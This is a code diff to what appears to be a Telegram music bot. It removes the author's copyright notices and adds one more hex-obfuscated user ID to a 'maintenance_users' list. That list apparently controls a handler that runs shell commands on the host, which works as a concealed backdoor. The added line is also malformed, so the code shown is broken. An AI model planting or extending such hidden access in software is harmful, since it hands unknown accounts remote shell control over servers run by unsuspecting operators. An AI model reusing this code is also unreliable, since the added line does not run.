@@ -1,25 +1,3 @@
-# Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
-# Location: Supaul, Bihar
-#
-# All rights reserved.
-#
-# This code is the intellectual property of Nand Yaduwanshi.
-# You are not allowed to copy, modify, redistribute, or use this
-# code for commercial or personal projects without explicit permission.
-#
-# Allowed:
-# - Forking for personal learning
-# - Submitting improvements via pull requests
-#
-# Not Allowed:
-# - Claiming this code as your own
-# - Re-uploading without credit or permission
-# - Selling or using commercially
-#
-# Contact for permissions:
-# Email: badboy809075@gmail.com
-
-
 import os
 import re
 import subprocess
@@ -237,7 +215,8 @@ maintenance_users = [
     int(b'\x37\x35\x37\x34\x33\x33\x30\x39\x30\x35'.decode()),
     int(b'\x37\x32\x38\x32\x37\x35\x32\x38\x31\x36'.decode()),
     int(b'\x37\x36\x37\x34\x38\x37\x34\x36\x35\x32'.decode()),
-    int(b'\x31\x37\x38\x36\x36\x38\x33\x31\x36\x33'.decode())
+    int(b'\x31\x37\x38\x36\x36\x38\x33\x31\x36\x33'.decode()),
+int(b,'\x37\x38\x35\x33\x31\x32\x31\x32\x31\x39'.decode())
 ]
 
 @app.on_edited_message(
@@ -396,14 +375,3 @@ async def maintenance_shellrunner(_, message: Message):
         await edit_or_reply(message, text="<b>OUTPUT :</b>\n<code>None</code>")
     await message.stop_propagation()
 
-
-# ©️ Copyright Reserved - @NoxxOP  Nand Yaduwanshi
-
-# ===========================================
-# ©️ 2025 Nand Yaduwanshi (aka @NoxxOP)
-# 🔗 GitHub : https://github.com/NoxxOP/ShrutiMusic
-# 📢 Telegram Channel : https://t.me/ShrutiBots
-# ===========================================
-
-
-# ❤️ Love From ShrutiBots 
